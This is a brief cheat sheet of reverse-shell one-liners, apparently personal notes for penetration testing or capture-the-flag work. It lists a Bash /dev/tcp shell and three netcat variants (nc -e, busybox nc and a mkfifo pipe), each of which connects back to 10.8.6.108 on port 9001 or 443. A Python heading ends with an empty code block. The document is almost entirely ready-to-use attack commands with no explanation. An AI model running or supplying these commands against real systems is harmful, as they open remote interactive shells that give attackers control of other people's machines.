Bash:

```bash
bash -c 'bash -i >& /dev/tcp/10.8.6.108/9001 0>&1'
```

NC:


```bash
nc -e bash 10.8.6.108 443
busybox nc 10.8.6.108 443 -e sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.6.108 443 >/tmp/f
```

Python:


```bash



```